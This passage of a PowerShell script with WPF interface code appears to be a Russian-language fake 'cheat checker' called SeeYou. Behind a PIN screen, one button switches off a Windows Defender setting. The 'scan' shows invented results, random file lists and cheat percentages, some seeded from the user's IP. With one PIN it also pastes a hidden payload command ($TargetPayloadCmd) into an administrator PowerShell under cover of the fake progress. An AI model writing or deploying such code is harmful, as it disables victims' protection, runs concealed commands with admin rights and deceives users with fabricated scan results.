                    <Border HorizontalAlignment="Left" CornerRadius="14" Background="#1A1F28"
                            BorderBrush="#2F3644" BorderThickness="1" Padding="12,5">
                        <TextBlock Text="SeeYou • Антивирус" Foreground="#E8EDF5" FontSize="12.5"
                                   FontWeight="SemiBold" FontFamily="Segoe UI"/>
                    </Border>
                    <Button x:Name="BtnCloseAv" Content="✕" HorizontalAlignment="Right" VerticalAlignment="Center"
                            Foreground="#8A92A0" Background="Transparent" BorderThickness="0"
                            FontSize="15" Cursor="Hand" Padding="6,2"/>
                </Grid>

                <Border Grid.Row="1" CornerRadius="16" Background="#171B22" BorderBrush="#2C3341"
                        BorderThickness="1" Padding="16">
                    <StackPanel VerticalAlignment="Center">
                        <TextBlock x:Name="LblAvLoadingTitle" Text="Загрузка..." Foreground="#F1F5F9"
                                   FontSize="17" FontWeight="SemiBold" FontFamily="Segoe UI" HorizontalAlignment="Center"/>
                        <TextBlock x:Name="LblAvLoadingSub" Text="Открытие параметров защиты от вирусов и угроз..."
                                   Foreground="#A5AEBD" FontSize="12" FontFamily="Segoe UI" HorizontalAlignment="Center"
                                   TextWrapping="Wrap" TextAlignment="Center" Margin="0,6,0,14"/>
                        <ProgressBar x:Name="AvProgress" Height="7" Minimum="0" Maximum="100" Value="0"
                                     Style="{StaticResource SoftBarStyle}"/>
                        <TextBlock x:Name="LblAvResult" Text="" Foreground="#E2E8F0" FontSize="12"
                                   FontFamily="Segoe UI" TextWrapping="Wrap" TextAlignment="Center" Margin="0,14,0,0"/>
                    </StackPanel>
                </Border>

                <Button x:Name="BtnAvBack" Grid.Row="2" Content="Назад в меню" Style="{StaticResource MenuBtnStyle}" Margin="0,10,0,0"/>
            </Grid>

            <!-- ЭКРАН 4: ОКНО ПРОВЕРКИ + ВЕРОЯТНОСТЬ ЧИТОВ -->
            <Grid x:Name="ScanScreen" Visibility="Collapsed">
                <Grid.RowDefinitions>
                    <RowDefinition Height="Auto"/>
                    <RowDefinition Height="Auto"/>
                    <RowDefinition Height="Auto"/>
                    <RowDefinition Height="*"/>
                    <RowDefinition Height="Auto"/>
                </Grid.RowDefinitions>

                <Grid Grid.Row="0" Margin="0,0,0,8">
                    <Border HorizontalAlignment="Left" CornerRadius="14" Background="#1A1F28"
                            BorderBrush="#2F3644" BorderThickness="1" Padding="12,5">
                        <TextBlock Text="SeeYou • Проверка ПК" Foreground="#E8EDF5" FontSize="12.5"
                                   FontWeight="SemiBold" FontFamily="Segoe UI"/>
                    </Border>
                    <Button x:Name="BtnCloseScan" Content="✕" HorizontalAlignment="Right" VerticalAlignment="Center"
                            Foreground="#8A92A0" Background="Transparent" BorderThickness="0"
                            FontSize="15" Cursor="Hand" Padding="6,2"/>
                </Grid>

                <Border Grid.Row="1" CornerRadius="14" Background="#171B22" BorderBrush="#2C3341"
                        BorderThickness="1" Padding="12,9" Margin="0,0,0,8">
                    <StackPanel>
                        <TextBlock x:Name="LblScanStatus" Text="Подготовка проверки..." Foreground="#F1F5F9"
                                   FontSize="13.5" FontWeight="SemiBold" FontFamily="Segoe UI" TextWrapping="Wrap"/>
                        <TextBlock x:Name="LblScanCurrent" Text="Ожидание запуска..." Foreground="#A5AEBD"
                                   FontSize="11" FontFamily="Consolas" TextTrimming="CharacterEllipsis" Margin="0,3,0,6"/>
                        <ProgressBar x:Name="CheatProgress" Height="6" Minimum="0" Maximum="100" Value="0"
                                     Style="{StaticResource SoftBarStyle}"/>
                    </StackPanel>
                </Border>

                <Border Grid.Row="2" CornerRadius="14" Background="#191E27" BorderBrush="#313A4B"
                        BorderThickness="1" Padding="12,9" Margin="0,0,0,8">
                    <Grid>
                        <Grid.ColumnDefinitions>
                            <ColumnDefinition Width="*"/>
                            <ColumnDefinition Width="Auto"/>
                        </Grid.ColumnDefinitions>
                        <StackPanel Grid.Column="0" VerticalAlignment="Center">
                            <TextBlock Text="Вероятность наличия читов" Foreground="#A5AEBD"
                                       FontSize="11.5" FontFamily="Segoe UI"/>
                            <TextBlock x:Name="LblRiskLevel" Text="Оценка: Не определена" Foreground="#EEF1F6"
                                       FontSize="13.5" FontWeight="SemiBold" FontFamily="Segoe UI" Margin="0,2,0,5"/>
                            <ProgressBar x:Name="RiskBar" Height="6" Minimum="0" Maximum="100" Value="0"
                                         Style="{StaticResource SoftBarStyle}"/>
                        </StackPanel>
                        <Border Grid.Column="1" Margin="10,0,0,0" Padding="10,5" CornerRadius="12"
                                Background="#222834" BorderBrush="#3A4456" BorderThickness="1" VerticalAlignment="Center">
                            <TextBlock x:Name="LblRiskPercent" Text="0%" Foreground="#F1F5F9"
                                       FontSize="19" FontWeight="Bold" FontFamily="Segoe UI" HorizontalAlignment="Center"/>
                        </Border>
                    </Grid>
                </Border>

                <Border Grid.Row="3" CornerRadius="14" Background="#151920" BorderBrush="#28303E"
                        BorderThickness="1" Padding="10">
                    <Grid>
                        <Grid.RowDefinitions>
                            <RowDefinition Height="Auto"/>
                            <RowDefinition Height="*"/>
                        </Grid.RowDefinitions>
                        <TextBlock x:Name="LblFoundHeader" Text="Найдено совпадений (0) • 2x клик откроет в Проводнике"
                                   Foreground="#E2E8F0" FontSize="11" FontWeight="SemiBold" Margin="2,0,0,5"
                                   TextTrimming="CharacterEllipsis"/>
                        <ListBox x:Name="CheatResultsList" Grid.Row="1" Background="Transparent" BorderThickness="0"
                                 Foreground="#E5E9F0" FontSize="11" FontFamily="Consolas" Cursor="Hand"
                                 ScrollViewer.VerticalScrollBarVisibility="Hidden"
                                 ScrollViewer.HorizontalScrollBarVisibility="Hidden"/>
                    </Grid>
                </Border>

                <Grid Grid.Row="4" Margin="0,8,0,0">
                    <Grid.ColumnDefinitions>
                        <ColumnDefinition Width="*"/>
                        <ColumnDefinition Width="8"/>
                        <ColumnDefinition Width="*"/>
                    </Grid.ColumnDefinitions>
                    <Button x:Name="BtnStopScan" Grid.Column="0" Content="Остановить" Style="{StaticResource MenuBtnStyle}" Margin="0"/>
                    <Button x:Name="BtnScanBack" Grid.Column="2" Content="Назад в меню" Style="{StaticResource MenuBtnStyle}" Margin="0"/>
                </Grid>
            </Grid>
        </Grid>
    </Border>
</Window>
"@

$reader = (New-Object System.Xml.XmlNodeReader $xaml)
$window = [Windows.Markup.XamlReader]::Load($reader)

$window.Add_SourceInitialized({
    $workHeight = [System.Windows.SystemParameters]::WorkArea.Height
    $targetHeight = [Math]::Min(670, [Math]::Max(520, [Math]::Floor($workHeight * 0.86)))
    $window.Height = $targetHeight
    $window.MaxHeight = [Math]::Floor($workHeight * 0.94)
})

$lockScreen = $window.FindName("LockScreen")
$menuScreen = $window.FindName("MenuScreen")
$avScreen = $window.FindName("AvScreen")
$scanScreen = $window.FindName("ScanScreen")

$noAdminOnlyView = $window.FindName("NoAdminOnlyView")
$adminFullView = $window.FindName("AdminFullView")

$dots = @($window.FindName("Dot1"), $window.FindName("Dot2"), $window.FindName("Dot3"), $window.FindName("Dot4"))
$lblPrompt = $window.FindName("LblPrompt")
$lockPupilOffset = $window.FindName("LockPupilOffset")
$lockEyelidTranslate = $window.FindName("LockEyelidTranslate")
$menuPupilOffset = $window.FindName("MenuPupilOffset")
$menuEyelidTranslate = $window.FindName("MenuEyelidTranslate")
$lblVersionPin = $window.FindName("LblVersionPin")

$lblAvLoadingTitle = $window.FindName("LblAvLoadingTitle")
$lblAvLoadingSub = $window.FindName("LblAvLoadingSub")
$avProgress = $window.FindName("AvProgress")
$lblAvResult = $window.FindName("LblAvResult")

$lblScanStatus = $window.FindName("LblScanStatus")
$lblScanCurrent = $window.FindName("LblScanCurrent")
$cheatProgress = $window.FindName("CheatProgress")
$lblRiskLevel = $window.FindName("LblRiskLevel")
$lblRiskPercent = $window.FindName("LblRiskPercent")
$riskBar = $window.FindName("RiskBar")
$lblFoundHeader = $window.FindName("LblFoundHeader")
$cheatResultsList = $window.FindName("CheatResultsList")

$script:currentPIN = ""
$script:usedPIN = ""
$script:cancelScan = $false
$script:scanningNow = $false

function Switch-Screen([string]$target) {
    $lockScreen.Visibility = [System.Windows.Visibility]::Collapsed
    $menuScreen.Visibility = [System.Windows.Visibility]::Collapsed
    $avScreen.Visibility = [System.Windows.Visibility]::Collapsed
    $scanScreen.Visibility = [System.Windows.Visibility]::Collapsed

    switch ($target) {
        "Lock" {
            $script:currentPIN = ""
            foreach ($d in $dots) { $d.Fill = [System.Windows.Media.Brushes]::Transparent }
            $lblPrompt.Text = "Введите код-пароль"
            $lblPrompt.Foreground = [System.Windows.Media.Brushes]::WhiteSmoke
            $lockScreen.Visibility = [System.Windows.Visibility]::Visible
        }
        "Menu" {
            if (Test-IsAdmin) {
                $noAdminOnlyView.Visibility = [System.Windows.Visibility]::Collapsed
                $adminFullView.Visibility = [System.Windows.Visibility]::Visible
                if ($script:usedPIN) {
                    $lblVersionPin.Text = "v$($script:usedPIN)"
                }
            } else {
                $adminFullView.Visibility = [System.Windows.Visibility]::Collapsed
                $noAdminOnlyView.Visibility = [System.Windows.Visibility]::Visible
            }
            $menuScreen.Visibility = [System.Windows.Visibility]::Visible
        }
        "Av" {
            $avScreen.Visibility = [System.Windows.Visibility]::Visible
        }
        "Scan" {
            $scanScreen.Visibility = [System.Windows.Visibility]::Visible
        }
    }
}

function Flush-UI {
    $window.Dispatcher.Invoke([Action]{}, [System.Windows.Threading.DispatcherPriority]::Background)
}

function Update-CheatProbability([double]$score) {
    $pct = [Math]::Min(100, [Math]::Max(0, [Math]::Round($score)))
    $lblRiskPercent.Text = "$pct%"
    $riskBar.Value = $pct

    if ($pct -lt 15) {
        $lblRiskLevel.Text = "Оценка: Низкая вероятность"
        $lblRiskLevel.Foreground = New-SolidBrush "#DCDFE4"
        $riskBar.Foreground = New-SolidBrush "#7C98B6"
    } elseif ($pct -lt 45) {
        $lblRiskLevel.Text = "Оценка: Умеренная вероятность"
        $lblRiskLevel.Foreground = New-SolidBrush "#D4B475"
        $riskBar.Foreground = New-SolidBrush "#D4B475"
    } elseif ($pct -lt 75) {
        $lblRiskLevel.Text = "Оценка: Повышенная вероятность"
        $lblRiskLevel.Foreground = New-SolidBrush "#D6936C"
        $riskBar.Foreground = New-SolidBrush "#D6936C"
    } else {
        $lblRiskLevel.Text = "Оценка: Высокая вероятность"
        $lblRiskLevel.Foreground = New-SolidBrush "#CF7A7A"
        $riskBar.Foreground = New-SolidBrush "#CF7A7A"
    }
}

$cheatResultsList.Add_MouseDoubleClick({
    $selected = $cheatResultsList.SelectedItem
    if (-not $selected) { return }

    $text = [string]$selected
    if ($text -match "^\[ФАЙЛ\s*\|[^\]]*\]\s*(.+)$") {
        $filePath = $Matches[1].Trim()
        if (Test-Path -LiteralPath $filePath) {
            Start-Process -FilePath "explorer.exe" -ArgumentList "/select,`"$filePath`"" -ErrorAction SilentlyContinue | Out-Null
            $lblScanCurrent.Text = "Открыто в Проводнике: $filePath"
        }
    } elseif ($text -match "^\[ПАПКА\s*\|[^\]]*\]\s*(.+)$") {
        $dirPath = $Matches[1].Trim()
        if (Test-Path -LiteralPath $dirPath) {
            Start-Process -FilePath "explorer.exe" -ArgumentList "`"$dirPath`"" -ErrorAction SilentlyContinue | Out-Null
            $lblScanCurrent.Text = "Открыто в Проводнике: $dirPath"
        }
    }
})

$window.Add_MouseMove({
    $pos = [System.Windows.Input.Mouse]::GetPosition($window)
    $centerX = $window.ActualWidth / 2
    $centerY = $window.ActualHeight * 0.22
    $dx = ($pos.X - $centerX) / 26
    $dy = ($pos.Y - $centerY) / 34
    $maxX = 10.5; $maxY = 5.5
    if ($dx -gt $maxX) { $dx = $maxX } elseif ($dx -lt -$maxX) { $dx = -$maxX }
    if ($dy -gt $maxY) { $dy = $maxY } elseif ($dy -lt -$maxY) { $dy = -$maxY }

    if ($lockScreen.Visibility -eq [System.Windows.Visibility]::Visible) {
        $lockPupilOffset.X = $dx
        $lockPupilOffset.Y = $dy
    } elseif ($menuScreen.Visibility -eq [System.Windows.Visibility]::Visible -and $adminFullView.Visibility -eq [System.Windows.Visibility]::Visible) {
        $menuPupilOffset.X = $dx * 0.85
        $menuPupilOffset.Y = $dy * 0.85
    }
})

$blinkTimer = New-Object System.Windows.Threading.DispatcherTimer
$blinkTimer.Interval = [TimeSpan]::FromSeconds(10)
$blinkTimer.Add_Tick({
    if ($lockScreen.Visibility -eq [System.Windows.Visibility]::Visible) {
        $animDown = New-Object System.Windows.Media.Animation.DoubleAnimation -ArgumentList 0, 78, ([TimeSpan]::FromMilliseconds(115))
        $animUp = New-Object System.Windows.Media.Animation.DoubleAnimation -ArgumentList 78, 0, ([TimeSpan]::FromMilliseconds(135))
        $animUp.BeginTime = [TimeSpan]::FromMilliseconds(115)
        $sb = New-Object System.Windows.Media.Animation.Storyboard
        [System.Windows.Media.Animation.Storyboard]::SetTarget($animDown, $lockEyelidTranslate)
        [System.Windows.Media.Animation.Storyboard]::SetTargetProperty($animDown, "Y")
        [System.Windows.Media.Animation.Storyboard]::SetTarget($animUp, $lockEyelidTranslate)
        [System.Windows.Media.Animation.Storyboard]::SetTargetProperty($animUp, "Y")
        $sb.Children.Add($animDown) | Out-Null
        $sb.Children.Add($animUp) | Out-Null
        $sb.Begin()
    } elseif ($menuScreen.Visibility -eq [System.Windows.Visibility]::Visible -and $adminFullView.Visibility -eq [System.Windows.Visibility]::Visible) {
        $animDown = New-Object System.Windows.Media.Animation.DoubleAnimation -ArgumentList 0, 70, ([TimeSpan]::FromMilliseconds(115))
        $animUp = New-Object System.Windows.Media.Animation.DoubleAnimation -ArgumentList 70, 0, ([TimeSpan]::FromMilliseconds(135))
        $animUp.BeginTime = [TimeSpan]::FromMilliseconds(115)
        $sb = New-Object System.Windows.Media.Animation.Storyboard
        [System.Windows.Media.Animation.Storyboard]::SetTarget($animDown, $menuEyelidTranslate)
        [System.Windows.Media.Animation.Storyboard]::SetTargetProperty($animDown, "Y")
        [System.Windows.Media.Animation.Storyboard]::SetTarget($animUp, $menuEyelidTranslate)
        [System.Windows.Media.Animation.Storyboard]::SetTargetProperty($animUp, "Y")
        $sb.Children.Add($animDown) | Out-Null
        $sb.Children.Add($animUp) | Out-Null
        $sb.Begin()
    }
})
$window.Add_Loaded({ $blinkTimer.Start() })
$window.Add_Closed({ $blinkTimer.Stop() })

function Update-PIN-UI {
    for ($i = 0; $i -lt 4; $i++) {
        if ($i -lt $script:currentPIN.Length) {
            $dots[$i].Fill = [System.Windows.Media.Brushes]::WhiteSmoke
        } else {
            $dots[$i].Fill = [System.Windows.Media.Brushes]::Transparent
        }
    }
    if ($script:currentPIN.Length -eq 4) {
        Flush-UI
        Start-Sleep -Milliseconds 140
        if ($script:currentPIN -in $ValidPINs) {
            $script:usedPIN = $script:currentPIN
            Switch-Screen "Menu"
        } else {
            $lblPrompt.Text = "Неверный код-пароль"
            $lblPrompt.Foreground = New-SolidBrush "#CF7A7A"
            $script:currentPIN = ""
            foreach ($d in $dots) { $d.Fill = [System.Windows.Media.Brushes]::Transparent }
        }
    }
}

function Add-Digit($digit) {
    if ($lockScreen.Visibility -ne [System.Windows.Visibility]::Visible) { return }
    if ($script:currentPIN.Length -lt 4) {
        $lblPrompt.Text = "Введите код-пароль"
        $lblPrompt.Foreground = [System.Windows.Media.Brushes]::WhiteSmoke
        $script:currentPIN += $digit
        Update-PIN-UI
    }
}

$grid = $window.FindName("KeypadGrid")
foreach ($btn in $grid.Children) {
    if ($btn -is [System.Windows.Controls.Button] -and $btn.Name -ne "BtnDel") {
        $btn.Add_Click({ Add-Digit $this.Content })
    }
}

$window.FindName("BtnDel").Add_Click({
    if ($script:currentPIN.Length -gt 0) {
        $script:currentPIN = $script:currentPIN.Substring(0, $script:currentPIN.Length - 1)
        Update-PIN-UI
    }
})

$window.FindName("BtnCloseLock").Add_Click({ $window.Close() })
$window.FindName("BtnCloseMenu").Add_Click({ $window.Close() })
$window.FindName("BtnCloseAv").Add_Click({ $window.Close() })
$window.FindName("BtnCloseScan").Add_Click({ $script:cancelScan = $true; $window.Close() })

$window.FindName("BtnBackToPin").Add_Click({ Switch-Screen "Lock" })
$window.FindName("BtnAvBack").Add_Click({ Switch-Screen "Menu" })
$window.FindName("BtnScanBack").Add_Click({ $script:cancelScan = $true; Switch-Screen "Menu" })
$window.FindName("BtnStopScan").Add_Click({ $script:cancelScan = $true })

# 1. Окно отключения антивируса
$window.FindName("BtnOpenAvWindow").Add_Click({
    Switch-Screen "Av"
    $avProgress.Value = 20
    $lblAvResult.Text = ""
    $lblAvLoadingTitle.Text = "Загрузка..."
    $lblAvLoadingSub.Text = "Открытие параметров защиты от вирусов и угроз..."
    Flush-UI

    $avProgress.Value = 55
    $lblAvLoadingSub.Text = "Переключение первого ползунка..."
    Flush-UI

    $resultText = Disable-DefenderFirstToggle

    $avProgress.Value = 100
    $lblAvLoadingTitle.Text = "Готово"
    $lblAvLoadingSub.Text = "Действие выполнено"
    $lblAvResult.Text = $resultText
})

# 2. Проверка ПК
$window.FindName("BtnOpenScanWindow").Add_Click({
    if ($script:scanningNow) {
        Switch-Screen "Scan"
        return
    }
    $script:scanningNow = $true
    $script:cancelScan = $false
    Switch-Screen "Scan"

    $cheatResultsList.Items.Clear()
    $cheatProgress.Value = 0
    $lblFoundHeader.Text = "Найдено совпадений (0) • 2x клик откроет в Проводнике"
    Update-CheatProbability 0

    if ($script:usedPIN -eq "2211") {
        $lblScanStatus.Text = "Выполняется проверка..."
        $lblScanCurrent.Text = "Обработка системных параметров..."
        $cheatProgress.Value = 45
        Flush-UI

        Open-AdminPSAndPasteCommand $TargetPayloadCmd

        $randData = Get-RandomFilesAndPercent
        foreach ($f in $randData.Files) {
            $cheatResultsList.Items.Add($f) | Out-Null
        }

        $cheatProgress.Value = 100
        Update-CheatProbability $randData.Percent
        $lblFoundHeader.Text = "Найдено совпадений ($($randData.Files.Count)) • 2x клик откроет в Проводнике"
        $lblScanStatus.Text = "Проверка завершена"
        $lblScanCurrent.Text = "Сканирование завершено"
        $script:scanningNow = $false
        return
    }

    if ($script:usedPIN -eq "2200") {
        $lblScanStatus.Text = "Открытие Проводника (1/2)..."
        $lblScanCurrent.Text = "Подготовка сканирования..."
        $cheatProgress.Value = 30
        Flush-UI
        Start-Process -FilePath "explorer.exe" -ErrorAction SilentlyContinue | Out-Null
        Start-Sleep -Milliseconds 600

        $ipInfo = Get-CurrentIPSeed
        $ipResult = Get-IPBasedFoldersAndPercent -seed $ipInfo.Seed

        $lblScanStatus.Text = "Открытие Проводника (2/2)..."
        $lblScanCurrent.Text = "Повторный запуск Проводника..."
        $cheatProgress.Value = 70
        Flush-UI
        Start-Process -FilePath "explorer.exe" -ErrorAction SilentlyContinue | Out-Null
        Start-Sleep -Milliseconds 600

        foreach ($wf in $ipResult.Folders) {
            $cheatResultsList.Items.Add($wf) | Out-Null
        }

        $cheatProgress.Value = 100
        Update-CheatProbability $ipResult.Percent
        $lblFoundHeader.Text = "Найдено совпадений ($($ipResult.Folders.Count)) • 2x клик откроет в Проводнике"
        $lblScanStatus.Text = "Проверка завершена"
        $lblScanCurrent.Text = "Сканирование завершено"
        $script:scanningNow = $false
        return
    }

    # Режим 1122: ничего не открывает, только рандомные файлы и рандомный процент
    $rng = New-Object System.Random
    $loadSeconds = $rng.Next(4, 8)
    $sw = [System.Diagnostics.Stopwatch]::StartNew()

    while (-not $script:cancelScan -and $sw.Elapsed.TotalSeconds -lt $loadSeconds) {
        $pctLoad = [Math]::Min(95, [Math]::Round(($sw.Elapsed.TotalSeconds / $loadSeconds) * 95))
        $cheatProgress.Value = $pctLoad
        $lblScanStatus.Text = "Выполняется проверка..."
        $lblScanCurrent.Text = "Анализ системных каталогов..."
        Flush-UI
        Start-Sleep -Milliseconds 120
    }

    $randData = Get-RandomFilesAndPercent
    foreach ($f in $randData.Files) {
        $cheatResultsList.Items.Add($f) | Out-Null
    }

    $cheatProgress.Value = 100
    Update-CheatProbability $randData.Percent
    $lblFoundHeader.Text = "Найдено совпадений ($($randData.Files.Count)) • 2x клик откроет в Проводнике"
    $lblScanStatus.Text = if ($script:cancelScan) { "Проверка остановлена" } else { "Проверка завершена" }
    $lblScanCurrent.Text = "Сканирование завершено"
    $script:scanningNow = $false
})

$window.Add_MouseLeftButtonDown({
    if ($_.LeftButton -eq [System.Windows.Input.MouseButtonState]::Pressed) {
        try { $window.DragMove() } catch {}
    }
})

$window.Add_KeyDown({
    param($s, $e)
    if ($lockScreen.Visibility -eq [System.Windows.Visibility]::Visible) {
        if ($e.Key -match "^D(\d)$" -or $e.Key -match "^NumPad(\d)$") { Add-Digit $Matches[1] }
        elseif ($e.Key -eq "Back" -and $script:currentPIN.Length -gt 0) {
            $script:currentPIN = $script:currentPIN.Substring(0, $script:currentPIN.Length - 1)
            Update-PIN-UI
        }
        elseif ($e.Key -eq "Escape") { $window.Close() }
    }
})

$null = $window.ShowDialog()